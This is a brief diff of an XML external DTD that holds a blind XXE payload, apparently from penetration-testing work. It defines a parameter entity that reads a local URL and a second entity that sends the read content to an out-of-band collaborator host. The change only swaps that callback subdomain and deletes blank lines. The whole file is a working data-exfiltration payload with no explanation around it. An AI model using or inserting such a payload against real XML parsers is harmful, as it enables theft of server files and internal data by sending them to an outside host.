@@ -1,9 +1,7 @@
 <!ENTITY % file SYSTEM "http://localhost.com/">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://0ab3s5ag2cj2sbvlux7hohhi59bzzo.pentestcollaborator.com/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://yjlr9p3p8r3zffp9ewp93mxg57bxzm.pentestcollaborator.com/?x=%file;'>">
 %eval;
 %exfiltrate;
-
-
 
 
 
